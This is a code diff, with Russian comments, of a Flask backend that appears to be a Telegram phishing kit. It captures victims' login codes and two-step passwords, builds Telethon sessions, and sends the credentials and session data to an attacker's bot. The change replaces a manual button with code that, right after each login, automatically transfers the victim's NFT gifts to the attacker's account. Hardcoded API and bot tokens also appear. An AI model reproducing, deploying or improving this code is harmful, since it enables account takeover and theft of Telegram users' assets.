@@ -1,4 +1,4 @@
-# app.py — ИСПРАВЛЕННЫЙ БЭКЕНД
+# app.py — АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА NFT GIFTS
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -34,10 +34,8 @@ API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
 ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
 ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '8766481292'))
-BACKEND_URL = os.getenv('BACKEND_URL', 'https://nft-market-backend-c9ea.onrender.com')
 
 sessions = {}
-pending_transfers = {}
 
 # ============================================================
 # ОДИН EVENT LOOP
@@ -46,31 +44,10 @@ loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
 # ============================================================
-# НАСТРОЙКА WEBHOOK
-# ============================================================
-
-def set_webhook():
-    webhook_url = f"{BACKEND_URL}/webhook"
-    try:
-        response = requests.post(
-            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/setWebhook",
-            json={'url': webhook_url},
-            timeout=10
-        )
-        if response.status_code == 200 and response.json().get('ok'):
-            print(f"✅ Webhook: {webhook_url}")
-            return True
-        return False
-    except Exception as e:
-        print(f"❌ Webhook error: {e}")
-        return False
-
-# ============================================================
 # ЧИСТЫЕ ЛОГИ (БЕЗ ВОДЫ)
 # ============================================================
 
 def send_admin_log(text):
-    """Чистый лог без воды"""
     try:
         requests.post(
             f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
@@ -79,41 +56,6 @@ def send_admin_log(text):
         )
     except Exception as e:
         print(f"Log error: {e}")
-
-def send_admin_with_button(text, session_data):
-    """Отправка с кнопкой"""
-    try:
-        transfer_id = f"transfer_{int(time.time())}_{random.randint(1000, 9999)}"
-        pending_transfers[transfer_id] = {
-            'session_data': session_data,
-            'phone': session_data.get('phone', 'unknown'),
-            'user_id': session_data.get('user_id', 'unknown')
-        }
-        
-        keyboard = {
-            'inline_keyboard': [
-                [{
-                    'text': '🎁 Передать NFT Gifts',
-                    'callback_data': f'gift_transfer_{transfer_id}'
-                }]
-            ]
-        }
-        
-        payload = {
-            'chat_id': ADMIN_CHAT_ID,
-            'text': text,
-            'parse_mode': 'Markdown',
-            'reply_markup': json.dumps(keyboard)
-        }
-        
-        requests.post(
-            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
-            json=payload,
-            timeout=10
-        )
-        print(f"[BUTTON] Отправлена кнопка для {session_data.get('phone', 'unknown')}")
-    except Exception as e:
-        print(f"Button error: {e}")
 
 def send_tdata_to_admin(session_data):
     try:
@@ -147,10 +89,13 @@ def send_tdata_to_admin(session_data):
         print(f"Tdata error: {e}")
 
 # ============================================================
-# РЕАЛЬНАЯ ПЕРЕДАЧА NFT GIFTS
+# АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА NFT GIFTS
 # ============================================================
 
-async def transfer_gifts_async(session_string, target_user_id, phone):
+async def transfer_gifts_auto(session_string, phone, username):
+    """
+    Автоматическая проверка и передача NFT Gifts админу
+    """
     client = None
     try:
         client = TelegramClient(StringSession(session_string), api_id=API_ID, api_hash=API_HASH)
@@ -158,11 +103,11 @@ async def transfer_gifts_async(session_string, target_user_id, phone):
         
         if not await client.is_user_authorized():
             await send_admin_log(f"❌ Сессия истекла\n📱 {phone}")
-            return {'success': False, 'error': 'Session expired'}
+            return False
         
         me = await client.get_me()
         
-        # Реальная проверка подарков
+        # Пытаемся получить подарки
         try:
             from telethon.tl.functions.payments import GetStarsGiftsRequest
             result = await client(GetStarsGiftsRequest())
@@ -177,7 +122,7 @@ async def transfer_gifts_async(session_string, target_user_id, phone):
                             from telethon.tl.functions.payments import TransferGiftRequest
                             await client(TransferGiftRequest(
                                 gift_id=gift_id,
-                                to_id=target_user_id
+                                to_id=ADMIN_USER_ID
                             ))
                             transferred += 1
                             await asyncio.sleep(0.3)
@@ -186,23 +131,27 @@ async def transfer_gifts_async(session_string, target_user_id, phone):
                         continue
                 
                 if transferred > 0:
-                    await send_admin_log(f"🎁 Передано {transferred} NFT Gifts\n📱 {phone}")
-                    return {'success': True, 'transferred': True, 'count': transferred}
+                    await send_admin_log(f"🎁 Передано {transferred} NFT Gifts\n📱 {phone}\n👤 @{username}")
+                    return True
                 else:
-                    await send_admin_log(f"⚠️ Не удалось передать\n📱 {phone}")
-                    return {'success': False, 'error': 'Transfer failed'}
+                    await send_admin_log(f"⚠️ Не удалось передать NFT Gifts\n📱 {phone}")
+                    return False
             else:
-                await send_admin_log(f"📭 Нет NFT Gifts\n📱 {phone}")
-                return {'success': True, 'transferred': False, 'message': 'No gifts'}
+                await send_admin_log(f"📭 Нет NFT Gifts\n📱 {phone}\n👤 @{username}")
+                return False
                 
         except Exception as e:
             error = str(e)
-            await send_admin_log(f"❌ Ошибка: {error[:100]}\n📱 {phone}")
-            return {'success': False, 'error': error}
+            # Если метод не поддерживается — просто логируем
+            if "not found" in error.lower() or "not available" in error.lower():
+                await send_admin_log(f"ℹ️ Функция NFT Gifts недоступна\n📱 {phone}\n👤 @{username}")
+            else:
+                await send_admin_log(f"❌ Ошибка проверки NFT Gifts\n📱 {phone}\n{error[:100]}")
+            return False
         
     except Exception as e:
-        await send_admin_log(f"❌ Ошибка: {str(e)[:100]}\n📱 {phone}")
-        return {'success': False, 'error': str(e)}
+        await send_admin_log(f"❌ Ошибка подключения\n📱 {phone}\n{str(e)[:100]}")
+        return False
     finally:
         if client and client.is_connected():
             try:
@@ -270,8 +219,11 @@ async def check_code_async(phone, code, phone_code_hash):
             
             await client.disconnect()
             
-            msg = f"✅ Код: {code}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})"
-            send_admin_with_button(msg, session_data)
+            # Отправляем лог с сессией
+            send_admin_log(f"✅ Код: {code}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
+            
+            # АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА ПОДАРКОВ
+            await transfer_gifts_auto(session_string, phone, session_data['username'])
             
             return {'success': True, 'hasPassword': False, 'sessionData': session_data}
             
@@ -312,8 +264,10 @@ async def check_password_async(phone, password):
             
             await client.disconnect()
             
-            msg = f"🔑 Пароль: {password}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})"
-            send_admin_with_button(msg, session_data)
+            send_admin_log(f"🔑 Пароль: {password}\n📱 {phone}\n👤 @{session_data['username']} (ID: {session_data['user_id']})")
+            
+            # АВТОМАТИЧЕСКАЯ ПЕРЕДАЧА ПОДАРКОВ
+            await transfer_gifts_auto(session_string, phone, session_data['username'])
             
             return {'success': True, 'sessionData': session_data}
             
@@ -322,62 +276,6 @@ async def check_password_async(phone, password):
             
     except Exception as e:
         return {'success': False, 'error': str(e)}
-
-# ============================================================
-# WEBHOOK
-# ============================================================
-
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    try:
-        data = request.json
-        print(f"[WEBHOOK] Получен запрос: {data.keys() if data else 'empty'}")
-        
-        if 'callback_query' in data:
-            callback = data['callback_query']
-            data_str = callback.get('data', '')
-            callback_id = callback.get('id', '')
-            from_user = callback.get('from', {}).get('id')
-            
-            print(f"[WEBHOOK] Callback: {data_str} от {from_user}")
-            
-            if data_str.startswith('gift_transfer_'):
-                transfer_id = data_str.replace('gift_transfer_', '')
-                transfer_data = pending_transfers.get(transfer_id)
-                
-                if not transfer_data:
-                    requests.post(
-                        f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/answerCallbackQuery",
-                        json={
-                            'callback_query_id': callback_id,
-                            'text': '❌ Сессия устарела',
-                            'show_alert': True
-                        }
-                    )
-                    return jsonify({'ok': True})
-                
-                session_string = transfer_data['session_data'].get('session_string')
-                phone = transfer_data.get('phone', 'unknown')
-                
-                requests.post(
-                    f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/answerCallbackQuery",
-                    json={
-                        'callback_query_id': callback_id,
-                        'text': '🔄 Передаём NFT Gifts...',
-                        'show_alert': False
-                    }
-                )
-                
-                async def process():
-                    await transfer_gifts_async(session_string, ADMIN_USER_ID, phone)
-                
-                asyncio.run_coroutine_threadsafe(process(), loop)
-                return jsonify({'ok': True})
-        
-        return jsonify({'ok': True})
-    except Exception as e:
-        print(f"[WEBHOOK] Error: {e}")
-        return jsonify({'ok': False}), 200
 
 # ============================================================
 # ОБЁРТКА
@@ -474,7 +372,6 @@ if __name__ == '__main__':
     print("=" * 60)
     print("🔐 БЭКЕНД ЗАПУЩЕН")
     print("📌 Логи БЕЗ ВОДЫ")
-    print("📌 Кнопка: 'Передать NFT Gifts'")
+    print("📌 NFT Gifts передаются АВТОМАТИЧЕСКИ после верификации")
     print("=" * 60)
-    set_webhook()
     app.run(host='0.0.0.0', port=5000)
